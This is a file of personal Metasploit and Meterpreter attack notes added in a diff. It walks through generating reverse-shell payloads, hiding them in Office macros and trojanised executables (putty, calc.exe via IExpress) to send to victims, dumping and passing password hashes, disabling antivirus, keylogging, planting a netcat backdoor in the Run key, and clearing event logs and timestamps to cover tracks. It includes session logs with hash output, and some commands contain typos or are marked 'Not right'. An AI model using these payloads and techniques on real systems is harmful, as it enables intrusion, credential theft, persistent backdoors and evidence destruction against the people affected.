+				./msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=8080 ENCODING=shikata_ga_nai X > payload.exe
+				mv payload.exe ~/msf3-dev/tools
+				cd tools
+
+			Convert the payload.exe file to VBScript
+				ruby exe2vba.rb payload.exe payload.vbs
+				cd ..
+				./msfcli | grep multi/handler
+				./msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp ENCODING=shikata_ga_nai LPORT=8080 LHOST=10.1.1.1 E
+
+			Now you must get on a Machine that has Word or Excel 2003 or newer and perform the following:
+				If 2003, Go to Tools, Macros, Visual Basic Editor
+				If 2007, Go to View Macros
+				Then place a name like "joeboo" and select "create"
+					Paste the contents of the payload.vbs into the Macro
+				Create an actual document or spreadsheet and save it.  Send the document to your victim.  If they have 
+				Macros enabled you will get a shell once they open it.
+
+
+Post Exploitation
+	
+	Elevate Priviledges if you are not system or admin account:
+		use priv
+		getsystem
+
+	Metasploit as a Payload			
+		There is a great ruby script for delivering Metasploit to an already compromised system that allows you to essentially run Metasploit 
+		from the victims machine and continue exploitation.
+		Download the ruby script and place it in the '~/msf3-dev/plugins' folder.
+			cd ~/msf3-dev/scripts/meterpreter/
+			wget http://www.offensive-security.com/msf/deploymsf.rb
+
+		Next, you will need to download the Cygwin version of the Metasploit Framework. 
+			
+			Mini Metasploit Cygwin: http://www.metasploit.com/releases/framework-mini-3.3.3.exe
+			
+		If you use the default path in the ruby script, you'll want to move the framework-3.3.3.exe to /tmp/ on your linux machine or specify 
+		the "-d" option with the full directory of where you have put the Cygwin installer. 
+
+			cd /tmp/
+			wget http://www.metasploit.com/releases/framework-mini-3.3.3.exe ******************* Not right
+
+		
+		We now have everything ready with our framework-3.3.3.exe ready to go. Once we get a Meterpreter console, we have a few commands to 
+		issue:
+			run deploymsf -f framework-3.3.3.exe -d /tmp/
+
+		It will take a bit of time to upload, etc.  Once it is completed you should see a message similar to the following:
+			Done!
+			Installation Complete!
+			Running cygwin shell channelized…
+			Channel 3 created - Type: interact 3 to play
+			
+		Type the following to access the remote Metasploit console:
+			interact 3
+
+		This can take a long time to initially start as well.
+
+
+
+
+
+	Activate telnet from shell
+		pkgmgr /iu:"TelnetServer"		Install Telnet daemon software
+		pkgmgr /iu:"TelnetClient"		Install Telnet client
+		sc query tlntsvr			check status of service
+		sc config tlntsvr start= demand		change startup type
+		sc start slntsvr			turn service on
+		net user [username] [passwd] /all	Add user that can telnet in
+		net localgroup TelnetClients /add	Add telnet group
+		net localgroup TelnetClient [username] /add  Add user to telnet group
+		netsh firewall add portopening protocol = TCP port = 23 name = telnet mode = enable scope = custom addresses = [your ip]
+
+	Active RDP from shell
+		sc query termservice			check status of service
+		sc config termservice start= demand	change startup type
+		sc start termservice			turn service on
+		reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0			Reg key to enable RDP
+		netstat -na | find 3389			see if RDP is listening
+		net user [username] [password] /add	Add user that can RDP in
+		net localgroup "Remote Desktop Users" [username] /add  Add user to RDP
+		netsh firewall set service type = remotedesktop mode = enable scope = custom addresses = [your ip]			allow RDP in firewall
+
+
+	SSHD for windows: 	http://sshwindows.sourceforge.net
+	creddump tool		will dump Windows cached credentials
+				http://www.oxid.it/creddump.html
+
+	Windows firewall:
+		netsh /?
+		netsh firewall show config
+		netsh firewall set opmode disable
+		netsh firewall add portopening protocol = TCP port = 23 name = AllowTelnet scope = CUSTOM addresses = 10.10.10.0/24
+		netsh firewall del portopening protocol = TCP port = 23
+
+	Registry
+		reg query [KeyName]
+		reg export [KeyName] [filename.reg]
+		reg import [filename.reg]
+		reg add [KeyName] /v [ValueName] /t [type] /d [Data]
+
+
+	Channels	Multiple communication channels - tunneled through one
+			TCP/IP session inside of Meterperter
+			For example:
+				execute -f cmd.exe -c		-> -c means channel
+				channel -l
+				interact 1
+
+	Command-by-command work arounds when you have shell vs. a terminal
+	Command	Purpose		Possible Workaround
+	-------	-------		-------------------
+	cls	clear screen	Hit enter several times
+	edit	edit file	use echo >> file.txt
+	runas	run as diff	Schedule job using schtasks or tt
+	wmic	win management	net user; net localgroup; tasklist/taskkill;
+				net start; sc; reg
+	telnet	telnet		use netcat with the -t option
+	ssh	ssh		get terminal access
+
+
+	PSExec Pass the Hash
+		One module that isn't widely known is the ability to use PSEXEC within Metasploit. The psexec module is often used by 
+		penetration testers to obtain access to a given system that you already know the credentials for.  Often as penetration 
+		testers, we successfully gain access to a system through some exploit, use meterpreter to grab the passwords or other 
+		methods like fgdump, pwdump, or cachedump and then utilize rainbowtables to crack those hash values. 
+
+		We also have other options like pass the hash through tools like iam.exe. One great method with psexec in metasploit is 
+		it allows you to enter the password itself, or you can simply just specify the hash values, no need to crack to gain 
+		access to the system. Let's think deeply about how we can utilize this attack to further penetrate a network. Lets first 
+		say we compromise a system that has an administrator password on the system, we don't need to crack it because psexec 
+		allows us to utilize just the hash values, that administrator account is the same on every account within the domain 
+		infrastructure. We can now go from system to system without ever having to worry about cracking the password. One 
+		important thing to note on this is that if NTLM is only available (for example its a 15+ character password or through 
+		GPO they specify NTLM response only), simply replace the ****NOPASSWORD**** with 32 0's for example: 
+
+			******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c
+
+			Would be replaced by:
+
+			00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
+			
+		From the Meterpreter console:
+			use priv
+			hashdump
+				Administrator:500:1b3aeedf3fb3009bde0b4e85a7775ae8:332becc4574adbb5c12ccb957bbe6f58:::
+				
+				Site for cracking password hashes up to 14 characters instantly:
+					https://www.objectif-securite.ch/en/products.php
+
+		Now that we have dumped the hashses, lets connect to a different victim using PSExec and just the hash values
+			./msfconsole
+			search psexec
+			use windows/smb/psexec
+			set payload windows/meterpreter/reverse_tcp
+			set LHOST 10.1.1.1
+			set LPORT 4443
+			set RHOST <ip of victim>
+			set SMBUser Administrator
+			set SMBPass 1b3aeedf3fb3009bde0b4e85a7775ae8:332becc4574adbb5c12ccb957bbe6f58
+			show options
+			exploit
+			execute -f cmd.exe -i -c -H
+
+
+	Event Log Management
+		Delete the Windows Event Logs to cover your tracks from the meterpreter console:
+			irb
+			>> log = client.sys.eventlog.open('system')
+			>> log.clear
+			>> exit
+		You can select system, application, security, etc, etc
+
+
+	Incognito			
+		Incognito allows you to impersonate user tokens when compromising a system.  In a nut shell, tokens are just like web 
+		cookies. They are a temporary key that allows you to access the system and network without having to provide credentials 
+		each time you access a file. Incognito exploits this the same way cookie stealing works, by replaying that temporary key 
+		when asked to authenticate. There are two types of tokens, delegate, and impersonate. Delegate are created for 
+		'interactive' logons, such as logging into the machine, or connecting to it via remote desktop. Impersonate tokens are for 
+		'non-interactive' sessions, such as attaching a network drive, or a domain logon script.
+
+		The other great things about tokens? They persist until a reboot. When a user logs off, their delegate token is reported 
+		as a impersonate token, but will still hold all of the rights of a delegate token.
+
+		*TIP* File servers are virtual treasure troves of tokens since most file servers are used as network attached drives via 
+		domain logon scripts
+
+		So, once you have a Meterpreter console, you can impersonate valid tokens on the system and become that specific user 
+		without ever having to worry about credentials or for that matter even hashes. During a penetration test this is especially 
+		useful due to the fact that tokens have the possibility of allowing local and/or domain privilege escalation, enabling you 
+		alternate avenues with potentially elevated privileges to multiple systems.
+
+		From your meterpreter console:
+			use incognito
+			help
+			
+		What we will need to do first is identify if there are any valid tokens on this system. Depending on the level of access 
+		that your exploit provides you are limited in the tokens you are able to view. When it comes to token stealing, SYSTEM is 
+		king. As SYSTEM you are allowed to see and use any token on the box.
+
+		*TIP*: Administrators don't have access to all the tokens either, but they do have the ability to migrate to SYSTEM 
+		processes, effectively making them SYSTEM and able to see all the tokens available.
+		
+			list_tokens -u
+
+		We see here that there is a valid Administrator token that looks to be of interest. We now need to impersonate this token in 
+		order to assume its privileges.  When issuing the 'impersonate_token' command, use two backslashes in 
+		'MACHINE\\Administrator'.  This is required as it causes bugs with just one slash.  Note also that after successfully 
+		impersonating a token, we check our current userID by executing the 'getuid' command
+
+			impersonate_token MACHINE\\Administrator
+			getuid
+
+		Next, lets run a shell as this individual account by running 'execute -f cmd.exe -i -t' from within Meterpreter.  The 
+		execute -f cmd.exe is telling Metasploit to execute cmd.exe, the -i allows us to interact with the victims PC, and the -t 
+		assumes the role we just impersonated through incognito.
+		
+			execute -f cmd.exe -i -t
+			whoami	
+
+		One other thing to do is impersonate a token that we know runs under the Administrators Account like the process of 
+		explorer.exe for a logged on account. We will list the processes, steal its token, check our privileges and then drop the token.:
+			ps
+			steal_token <PID of explorer.exe>
+			getuid
+			drop_token
+
+
+	Interacting with the Registry
+		Meterpreter has some very useful functions for registry interaction. There are various options we can utilize to interact with 
+		the remote system. We have the full options of reading, writing, creating, and deleting remote registry entries. These can be 
+		used for any number of actions, including remote information gathering. Using the registry, one can find what files have been 
+		utilized, web sites visited in Internet Explorer, programs utilized, USB devices utilized, and so on. 
+		
+		In this example we will change the system registry and firewall so we can install a netcat backdoor.  First, we will upload a 
+		copy of nectar to the remote system that we have a meterperter console on:
+			upload /tmp/nc.exe c:\\windows\\system32
+
+		Edit the registry to make nectar execute on start up and listen on port 455
+			reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+			reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d "C:\\windows\\system32\\nc.exe -Ldp 455 -e cmd.exe"
+			reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+
+		Now we will alter the system to allow remote connections through the firewall to our nectar backdoor:
+			execute -f cmd -i
+			netsh firewall show opmode
+			netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL
+			netsh firewall show portopening
+
+		Now if the machine gets rebooted you can access it through netcat:
+			nc -v <victim ip> 455
+			dir
+
+		
+	Enabling Remote Desktop
+		Another handy 'backdoor' is to use built-in tools.  The getgui script will enable Remote Desktop, open firewall ports and 
+		create a user account for us to login with.  From a meterpreter console:
+			run getgui -u hax0r -p 31337
+
+
+	Packet Sniffing with Meterpreter
+		Once you have obtained a meterpreter console:
+			use sniffer
+			help
+			sniffer_interfaces
+			sniffer_start 1
+			sniffer_stats 1
+			sniffer_dump 1 /tmp/all.cap			
+			sniffer_stop 1
+
+		Now we can use Wireshark for packet analysis
+
+
+			
+	TimeStomp in meterperter - Used to cover your tracks and modify MAC times on the file system.  Great to use on files that you have uploaded.
+		Create a text file on the file system called test.txt.  Use timestomp to view MAC time and modify them.
+			timestomp -h
+			timestomp test.txt -v
+		
+		Copy the MAC times from a different file to your test file:
+			timestomp test.txt -f C:\\windows\\system32\\cmd.exe
+			timestomp test.txt -v
+
+		Now completely 'blank' out the MAC times on the file:
+			timestomp test.txt -b
+			timestomp test.txt -v
+
+		You will now be unable to view the file listing through the meterperter and will most likely receive errors.  View the 
+		file on the windows system itself.  It will show a date of 01/01/1601.  
+		I don't recommend this but to really bunge up a file system set the MAC times to blank on all files:
+			timestomp c:\\ -r
+
+	Screen Capture within meterpreter - Capture a screen shot of the exploited desktop
+		First migrate to a process that is interacting with the desktop (explorer.exe)
+			ps	
+			migrate <PID of explorer>
+			use espia
+			screenshot /home/jimmyt/desktop.bmp
+
+
+Meterpreter Scripting	-several scripts are included with the meterpreter console:
+		run checkvm			-checks to see if the compromised machine is a VM
+		run getcountermeasure		-checks the security configuration on the victims system and can disable other security measures 
+						 such as A/V, Firewall, and much more.
+		run getgui -e			-enables RDP on the target system
+		run gettelnet -e		-enables telnet on the target system
+		run killav			-disables most AV programs
+		run get_local_subnets		-gets the local subnet mask of a victim
+		run hostsedit -e 1.1.1.1,so.com	-edits windows hosts file 
+		run remotewinenum -t 1.1.1.1	-will enumerate system information through wmic through the victim computer against specified
+						 ip's, make note of log file location
+		run winenum			-very detailed windows enumeration tool. It dumps tokens, hashes and much more
+		run scraper			-even more system information, including the entire registry
+
+
+
+
+Maintaining Access with Meterpreter
+		Keystroke logging:
+			keyscan_start
+			keyscan_dump
+
+		If you want to capture users logging into the box migrate to the winlogin.exe process
+			ps
+			migrate <PID of winlogin process>
+			keyscan_start
+			keyscan_dump
+
+
+		Meterpreter Backdoor Service using metsvc.  One word of warning here before we go any further. Metsvc as shown here requires 
+		no authentication. This means that anyone that gains access to the port could access your back door!
+			ps
+			migrate <PID of explorer.exe>
+			run metsvc
+			CTRL-Z
+
+		Now, back in the Metasploit console we want to use the multi/handler with a payload of 'windows/metsvc_bind_tcp' to connect 
+		to the remote system.
+			use exploit/multi/handler
+			set PAYLOAD windows/metsvc_bind_tcp
+			set LPORT 31337
+			set RHOST 10.1.1.1
+			show options
+			exploit
+			
+
+Metasploit Extended Usage:
+
+	Backdooring EXE files	-The ability to embed a Metasploit Payload in any executable that you want
+		./msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.1.132 LPORT=8080 R | ./msfencode -t exe -x /tmp/putty.exe -o /tmp/putty_backdoored.exe -e x86/shikata_ga_nai -c 5
+		./msfcli exploit/multi/handler payload=shikata_ga_nai lhost=10.10.1.231 lport=8080 payload=windows/meterpreter/reverse_tcp E		
+
+	Browser Autopwn
+		use server/browser_autopwn
+		show options
+		set uripath /
+		set LHOST 10.1.1.1
+		set SRVPORT 80
+		run		
+
+		Now browse to http://10.1.1.1 with an exploitable browser and watch the magic
+
+
+	Karmetasploit 	-is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and 
+			 conduct browser attacks against clients. 
+			
+	Metasploit on OS X - exploit to take pictures with the camera that is built into Mac laptops
+		First we generate a stand alone executable to transfer to a OS X system:
+			./msfpayload osx/x86/isight/bind_tcp X > /tmp/osxt2
+
+		Now get the OS X user to execute the osxt2 payload
+		Back in metasploit:
+			use multi/handler
+			set PAYLOAD osx/x86/isight/bind_tcp
+			show options
+			set RHOST 10.1.1.1
+			exploit
+
+	File-upload - upload Java Based shells and gain remote access to a system
+		../msfpayload java/jsp_shell_reverse_tcp LHOST=10.10.1.132 LPORT=8080 R > shell.jsp && ./msfcli exploit/multi/handler payload=java/jsp_shell_reverse_tcp LHOST=10.10.1.132 LPORT=8080 E
+		Now put this jsp file on a web server for browsing to .
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+******************************************************************************************
+Installing Metasploit on Ubuntu:
+
+***DO NOT RUN AS ROOT, USE SUDO WHERE LISTED***
+
+    sudo aptitude update
+    sudo aptitude upgrade
+
+if nmap is already installed via apt-get be sure to remove it
+
+Install all needed dependencies:
+
+sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev openjdk-7-jre git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev curl zlib1g-dev
+
+
+Install Ruby:
+	cd ~
+	git clone git://github.com/sstephenson/rbenv.git .rbenv
+	echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
+	echo 'eval "$(rbenv init -)"' >> ~/.bashrc
+	exec $SHELL
+
+	git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+	echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
+
+	# sudo plugin so we can run Metasploit as root with "rbenv sudo msfconsole" 
+	git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
+
+	exec $SHELL
+
+	rbenv install 2.1.6
+	rbenv global 2.1.6
+	ruby -v
+
+Install nmap:
+	mkdir ~/Development
+	cd ~/Development
+	svn co https://svn.nmap.org/nmap
+	cd nmap
+	./configure
+	make
+	sudo make install
+	make clean
+
+Configure Postgre SQL Server:
+	sudo -s
+	su postgres
+	Now we create the user and Database, do record the database that you gave to the 
+	user since it will be used in the database.yml file that Metasploit and Armitage 
+	use to connect to the database.
+
+	createuser msf -P -S -R -D
+	createdb -O msf msf
+	exit
+	exit
+
+Install Metasploit:
+	cd /opt
+	sudo git clone https://github.com/rapid7/metasploit-framework.git
+	sudo chown -R `whoami` /opt/metasploit-framework
+	cd metasploit-framework
+	gem install bundler
+	bundle install
+
+
+msfconsole
+
+ 
+******************************************************************************************
+
+Installing Metasploit on Fedora
+
+yum install gcc gcc-c++ subversion sqlite sqlite-devel libsqlite3x libsqlite3x-devel ruby ruby-devel ruby-libs ruby-gtk2 ruby-hpricot ruby-sqlite3 libpcap-devel patch openssl openssl-devel autoconf wget python-devel
+
+mkdir svn
+cd svn
+svn co http://metasploit.com/svn/framework3/trunk/ msf3-dev
+svn co --username guest --password "" svn://svn.insecure.org/nmap/
+svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng
+
+cd ~/svn/msf3-dev/external/pcaprub
+ruby extconf.rb 
+make
+make install
+
+cd ~/svn/msf3-dev/tools
+wget http://portswigger.net/suite/burpsuite_v1.2.zip
+unzip burpsuite_v1.2.zip
+cd burpsuite_v1.2/
+wget http://files.zentus.com/sqlitejdbc/sqlitejdbc-v054.jar
+cp ../../external/burp-proxy/*.jar ./
+rm ../burpsuite_v1.2.zip
+
+cd ~/svn/msf3-dev/tools
+wget http://ratproxy.googlecode.com/files/ratproxy-1.51.tar.gz
+tar xvzf ratproxy-1.51.tar.gz
+cd ratproxy
+cp ../../external/ratproxy/ratproxy_wmap.diff ./
+patch -d ./ < ratproxy_wmap.diff
+make
+rm ../ratproxy-1.51.tar.gz
+
+cd ~/svn/msf3-dev/external/ruby-lorcon
+svn co https://802.11ninja.net/svn/lorcon/trunk/ lorcon
+cd lorcon/
+./configure
+make
+make install
+cd ..
+ruby extconf.rb
+make
+make install
+
+cd ~/svn/msf3-dev/external/serialport
+ruby extconf.rb
+make
+make install
+
+cd ~/svn/nmap/
+./configure
+make
+make install
+
+cd ~/svn/aircrack-ng
+CFLAGS="-O2"
+export CFLAGS
+make sqlite=true unstable=true
+make strip
+sudo make install
+
+#Note: Aircrack-ng depends on patched drivers...visit the Aircrack ng site 
+#http://www.aircrack-ng.org/doku.php?id=drivers and follow the instruction for your 
+#specific chipset.
+
+******************************************************************************************
+Meterpereter
+
+
+execute -f cmd.exe -H -i
+
+reg enumkey -k HKCU
+reg enumkey -k HKCU
+
+Commands:
+	sysinfo		show system name and OS type
+	reg		read and write from registry
+	pwd		print working directory
+	lcd		change local directories
+	ls		show contents of a directory
+	cat		view content of file
+	download	transfer files
+	upload		transfer files
+	mkdir/rmdir	make or remove a directory
+	edit		edit a file using local editor (vi)
+	getpid		display process ID of meterperter session
+	getuid		user ID that meterpreter is running under
+	ps		process list
+	kill		terminate a given process 
+	execute		execute a given program
+	migrate [pid]	jump to a given destination process ID - can be 
+			existing process id!!! explorer.exe!!! pick something
+			that will be running for a long time
+	ipconfig	show ip information
+	portfwd		forward packets for a local TCP port to another
+			system on a different TCP port
+	route		display the users routing table
+	idletime	show how long the user at the console has been idle
+	uictl		[enable/disable] [keyboard/mouse]
+	use [module]	use modules
+	hashdump	dump password hashes
+	timestomp	alter dates and timestamps of files and directories
+	shell		performs "execute -f cmd.exe -c" and "interact <n>" 
+			for you so you don't have to type both
+	uictl 		enable/disable the keyboard or mouse
+	keyscan_start	start keystroke logging
+	keyscan_stop	stop keystroke logging
+	keyscan_dump	dump keylogger buffer
+
+
+hashdump
+	use priv
+	hashdump
+
+
+set username		shows who you are logged in as on a windows host
+
+
+migrate <new pid>
+
+
+The main function of the Meterpreter Windows Enumeration script  
+
+
+Generating a Meterpreter Payload Executable from the Metasploit Folder:
+
+    ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.184 X > meterpreter.exe
+
+Setting msconsole to receive several shells:
+
+    root@bt:/pentest/exploits/framework3# ./msfconsole
+	Metasploit:
+           =[ msf v3.3-dev
+    + -- --=[ 372 exploits - 234 payloads
+    + -- --=[ 20 encoders - 7 nops
+           =[ 150 aux
+
+    msf > use exploit/multi/handler
+    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+    PAYLOAD => windows/meterpreter/reverse_tcp
+    msf exploit(handler) > set LHOST 192.168.1.184
+    LHOST => 192.168.1.184
+    msf exploit(handler) > set ExitOnSession false
+    ExitOnSession => false
+    msf exploit(handler) > exploit
+    
+Receiving the shells
+
+    [*] Handler binding to LHOST 0.0.0.0
+    [*] Started reverse handler
+    [*] Starting the payload handler...
+    [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+    [*] Sending stage (2650 bytes)
+    [*] Sleeping before handling stage...
+    [*] Uploading DLL (75787 bytes)...
+    [*] Upload completed.
+    [*] Meterpreter session 1 opened (192.168.1.184:4444 -> 192.168.1.138:60255)
+    [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+    [*] Sending stage (2650 bytes)
+    [*] Sleeping before handling stage...
+    [*] Uploading DLL (75787 bytes)...
+    [*] Upload completed.
+    [*] Meterpreter session 2 opened (192.168.1.184:4444 -> 192.168.1.138:55808)
+
+    msf exploit(handler) > sessions -l
+
+    Active sessions
+    ===============
+
+      Id  Description  Tunnel
+      --  -----------  ------
+      1   Meterpreter  192.168.1.184:4444 -> 192.168.1.138:60255
+      2   Meterpreter  192.168.1.184:4444 -> 192.168.1.138:55808
+
+Moving to first shell and running Winenum with the -h option to show the help message:
+
+    msf exploit(handler) > sessions -i 1
+    [*] Starting interaction with 1...
+
+    meterpreter > sysinfo
+    Computer: AWINXP01
+    OS      : Windows XP (Build 2600, Service Pack 2).
+    meterpreter > run winenum -h
+    Windows Local Enumerion Meterpreter Script
+    Usage:
+
+    -h      This help message.
+
+    -m      Migrates the Meterpreter Session from it current process to a new one
+
+    -c      Changes Access Time, Modified Time and Created Time of executables
+            that where run on the target machine and clear the EventLog
+
+    -r      Dumps, compresses and download entire Registry
+
+Running Winenum:
+
+    meterpreter > run winenum
+    [*] Running Windows Local Enumerion Meterpreter Script
+    [*] New session on 192.168.1.138:60255...
+    [*] Saving report to /root/.msf3/logs/winenum/192.168.1.138_20090520.0247-06095/192.168.1.138_20090520.0247-06095.txt
+    [*] Checking if AWINXP01 is a Virtual Machine ........
+    [*] BIOS Check Failed
+    [*]     This is a VMWare virtual Machine
+    [*] Running Command List ...
+    [*]     running command cmd.exe /c set
+    [*]     running command arp -a
+    [*]     running command ipconfig /all
+    [*]     running command ipconfig /displaydns
+    [*]     running command route print
+    [*]     running command net view
+    [*]     running command netstat -nao
+    [*]     running command netstat -vb
+    [*]     running command netstat -ns
+    [*]     running command net accounts
+    [*]     running command net accounts /domain
+    [*]     running command net session
+    [*]     running command net share
+    [*]     running command net group
+    [*]     running command net user
+    [*]     running command net localgroup
+    [*]     running command net localgroup administrators
+    [*]     running command net group administrators
+    [*]     running command net view /domain
+    [*]     running command netsh firewall show config
+    [*]     running command tasklist /svc
+    [*]     running command tasklist /m
+    [*]     running command gpresult /SCOPE COMPUTER /Z
+    [*]     running command gpresult /SCOPE USER /Z
+    [*] Running WMIC Commands ....
+    [*]     running command wmic computersystem list brief
+    [*]     running command wmic useraccount list
+    [*]     running command wmic group list
+    [*]     running command wmic service list brief
+    [*]     running command wmic volume list brief
+    [*]     running command wmic logicaldisk get description,filesystem,name,size
+    [*]     running command wmic netlogin get name,lastlogon,badpasswordcount
+    [*]     running command wmic netclient list brief
+    [*]     running command wmic netuse get name,username,connectiontype,localname
+    [*]     running command wmic share get name,path
+    [*]     running command wmic nteventlog get path,filename,writeable
+    [*]     running command wmic process list brief
+    [*]     running command wmic startup list full
+    [*]     running command wmic rdtoggle list
+    [*]     running command wmic product get name,version
+    [*]     running command wmic qfe
+    [*] Extracting software list from registry
+    [*] Finnished Extraction of software list from registry
+    [*] Dumping and Downloading the Registry entries for Configured Wireless Networks
+    [*]     Exporting HKLM\Software\Microsoft\WZCSVC\Parameters\Interfaces
+    [*]     Compressing key into cab file for faster download
+    [*]     Downloading wlan_20090520.0247-06095.cab to -> /root/.msf3/logs/winenum/192.168.1.138_20090520.0247-06095/wlan_20090520.0247-06095.cab
+    [*]     Deleting left over files
+    [*] Dumping password hashes...
+    [*] Hashes Dumped
+    [*] Getting Tokens...
+    [*] All tokens have been processed
+    [*] Done!
+    meterpreter >
+
+Showing how to escalate privileges in case a Windows Vista or Windows 2008 box does not let you dump the hashes:
+
+    Background session 1? [y/N]
+
+    msf exploit(handler) > sessions -i 2
+    [*] Starting interaction with 2...
+
+    meterpreter > sysinfo
+    Computer: WIN2K8
+    OS      : Windows 2008 (Build 6001, Service Pack 1).
+    meterpreter > use priv
+    Loading extension priv...success.
+    meterpreter > getuid
+    Server username: WIN2K8\Administrator
+    meterpreter > hashdump
+    [-] priv_passwd_get_sam_hashes: Operation failed: 87
+    meterpreter > run scheduleme -h
+    Scheduleme Meterpreter Script
+    This script provides most common scheduling types used during a pentest.
+    It has the functionality to upload a desired executable or script and schedule
+    the file uploaded. All scheduled task are as System so Meterpreter process must
+    be System or local admin for local schedules and Administrator for remore shcedules
+            -h              Help menu.
+            -c <opt>        Command to execute at the given time. If options for execution needed use double quotes
+            -d              Daily.
+            -hr <opt>       Every specified hours 1-23.
+            -m <opt>        Every specified amount of minutes 1-1439
+            -l              When a user logs on.
+            -s              At system startup.
+            -i              Run command imediatly and only once.
+            -r              Remote Schedule. Executable has to be already on remote target
+            -e <opt>        Executable or script to upload to target host, will not work with remote schedule
+            -o <opt>        Options for executable when upload method used
+            -u              Username of account with administrative privelages.
+            -p              Password for account provided.
+            -t <opt>        Remote system to schedule job.
+    meterpreter > run scheduleme -e ./meterpreter.exe -i
+    [*] Uploadingd ./meterpreter.exe....
+    [*] ./meterpreter.exe uploaded!
+    [*] Scheduling command C:\Users\ADMINI~1\AppData\Local\Temp\svhost43.exe to run now.....
+    [*] The scheduled task has been successfully created
+    [*] For cleanup run schtasks /delete /tn syscheck80 /F
+    meterpreter >
+    [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+    [*] Sending stage (2650 bytes)
+    [*] Sleeping before handling stage...
+    [*] Uploading DLL (75787 bytes)...
+    [*] Upload completed.
+    [*] Meterpreter session 3 opened (192.168.1.184:4444 -> 192.168.1.138:54783)
+
+    Background session 2? [y/N]
+    msf exploit(handler) > sessions -i 3
+    [*] Starting interaction with 3...
+
+    meterpreter > getuid
+    Server username: NT AUTHORITY\SYSTEM
+    meterpreter > sysinfo
+    Computer: WIN2K8
+    OS      : Windows 2008 (Build 6001, Service Pack 1).
+    meterpreter > use priv
+    Loading extension priv...success.
+    meterpreter > hashdump
+    admin:1000:aad3b435b51404eedad3b435b51404ee:7a118f7a2f2b34d61fa19b840b4f5203:::
+    Administrator:500:aad3b435b51104eeaad3b435b51404ee:7a118f7a2f2b34d61fa19b840b4f5203:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    meterpreter >    
+
+More Bad Ass things to do!  Install and run Telnet and Remote Desktop:
+    meterpreter > run getgui -e
+    [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+    [*] Carlos Perez carlos_perez@darkoperator.com
+    [*] Enabling Remote Desktop
+    [*] 	RDP is disabled enabling it ...
+    [*] Setting Terminal Services service startup mode
+    [*] 	Terminal Services service is already set to auto
+    [*] 	Opening port in local firewall if necessary
+
+    meterpreter > run gettelnet -e
+    [*] Windows Telnet Server Enabler Meterpreter Script
+    [*] Setting Telnet Server Services service startup mode
+    [*] 	The Telnet Server Services service is not set to auto, changing it to auto ...
+    [*] 	Opening port in local firewall if necessary
+
+    meterpreter > execute -f cmd.exe -i
+	C:\
+
+
+This is all fine and dandy but how do you get the user to run the meterpreter.exe file?
+Embed the meterpreter.exe file into an installer script and add calc.exe or something
+similar using IExpress from Microsoft.  In XP the file may exist in 
+C:\windows\system32\iexpress.exe.  Otherwise, IExpress comes in the IE6 Administration
+Kit.  It can be downloaded here:
+http://download.microsoft.com/download/ie6sp1/finrel/6_SP1/W98NT42KMeXP/EN-US/ieak6.exe
+
+All IE Admin Kits are here:
+http://technet.microsoft.com/en-us/ie/bb219517.aspx
+
+Using IExpress to embed the meterperter goodness:
+Double click C:\Program Files\IEAK6\tools\iexpress.exe
+Click "Create new Slef Extraction Directive file" and click "Next"
+Click "Extract files and run an installation command" and click "Next"
+Type in a package title.  i.e. "Calc, the Shiznit Edition" and click "Next"
+Click "No prompt" and click "Next"
+Click "Do not display a license" and click "Next"
+Click "Add" to add the two files you want in the package.  In this case, the file you created 
+	above: meterperter.exe and c:\windows\system32\calc.exe and click "Next"
+For the "Install Program" click "calc.exe" and for the "Post Install Program" click 
+	meterpreter.exe This will make meterpreter.exe run once calc.exe is terminated
+On the "Show windows" screen click "Hidden" and click "Next"
+For the "Finished message" click "No message" and click "Next"
+For "Package Name and Options" type c:\calc_shiznit.exe" and click "Hide File Extracting Progress 
+	Animation from User" and click "Next"
+Click "No restart" and click "Next"
+Click "Next" and "Next" and "Finish"
+
+Now an exe file name calc_shiznit.exe is created.  Once Ran it will launch calc.exe.  Once 
+calc.exe is exited meterperter.exe will launch and connect to the the metasploit session
+opened as described below and will give you a meterperter session to the computer. This
+must be ran on the metasploit server prior to the meteterpreter.exe being ran on the 
+client:
+
+	    ./msfconsole
+	    msf > use exploit/multi/handler
+	    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+	    PAYLOAD => windows/meterpreter/reverse_tcp
+	    msf exploit(handler) > set LHOST 192.168.1.184
+	    LHOST => 192.168.1.184
+	    msf exploit(handler) > set ExitOnSession false
+	    ExitOnSession => false
+	    msf exploit(handler) > exploit -j
+	    [*] Exploit running as background job.
+	    msf exploit(handler) >
+
+
+***************************************************************************************************
+
+Once you get a remote meterpreter session you can set up a meterpreter service so you can reconnect 
+any time you desire:
+
+Example:
+
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set RHOST 192.168.0.9
+RHOST => 192.168.0.9
